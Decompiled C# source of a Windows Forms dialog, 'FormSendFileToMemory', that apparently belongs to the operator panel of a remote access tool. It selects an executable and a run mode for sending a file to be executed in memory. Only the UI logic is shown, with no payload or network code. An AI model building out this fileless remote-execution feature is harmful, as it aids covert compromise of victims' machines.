using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Server.Helper;

namespace Server
{
	// Token: 0x0200000C RID: 12
	public partial class FormSendFileToMemory : Form
	{
		// Token: 0x06000057 RID: 87 RVA: 0x00008D0C File Offset: 0x00006F0C
		public FormSendFileToMemory()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000058 RID: 88 RVA: 0x00008D1A File Offset: 0x00006F1A
		private void SendFileToMemory_Load(object sender, EventArgs e)
		{
			this.comboBox1.SelectedIndex = 0;
			this.comboBox2.SelectedIndex = 0;
		}

		// Token: 0x06000059 RID: 89 RVA: 0x00008D34 File Offset: 0x00006F34
		private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
		{
			int selectedIndex = this.comboBox1.SelectedIndex;
			if (selectedIndex == 0)
			{
				this.label3.Visible = false;
				this.comboBox2.Visible = false;
				return;
			}
			if (selectedIndex != 1)
			{
				return;
			}
			this.label3.Visible = true;
			this.comboBox2.Visible = true;
		}

		// Token: 0x0600005A RID: 90 RVA: 0x00008D88 File Offset: 0x00006F88
		private void button1_Click(object sender, EventArgs e)
		{
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				openFileDialog.Filter = "(*.exe)|*.exe";
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					this.toolStripStatusLabel1.Text = Path.GetFileName(openFileDialog.FileName);
					this.toolStripStatusLabel1.Tag = openFileDialog.FileName;
					this.toolStripStatusLabel1.ForeColor = Color.Green;
					this.IsOK = true;
					if (this.comboBox1.SelectedIndex != 0)
					{
						goto IL_DD;
					}
					try
					{
						new ReferenceLoader().AppDomainSetup(openFileDialog.FileName);
						this.IsOK = true;
						return;
					}
					catch
					{
						this.toolStripStatusLabel1.ForeColor = Color.Red;
						ToolStripStatusLabel toolStripStatusLabel = this.toolStripStatusLabel1;
						toolStripStatusLabel.Text += " Invalid!";
						this.IsOK = false;
						return;
					}
				}
				this.toolStripStatusLabel1.Text = "";
				this.toolStripStatusLabel1.ForeColor = Color.Black;
				this.IsOK = true;
				IL_DD:;
			}
		}

		// Token: 0x0600005B RID: 91 RVA: 0x00008E9C File Offset: 0x0000709C
		private void button2_Click(object sender, EventArgs e)
		{
			if (this.IsOK)
			{
				base.Hide();
			}
		}

		// Token: 0x0600005C RID: 92 RVA: 0x00008EAC File Offset: 0x000070AC
		private void Button3_Click(object sender, EventArgs e)
		{
			this.IsOK = false;
			base.Hide();
		}

		// Token: 0x0400008F RID: 143
		public bool IsOK;
	}
}
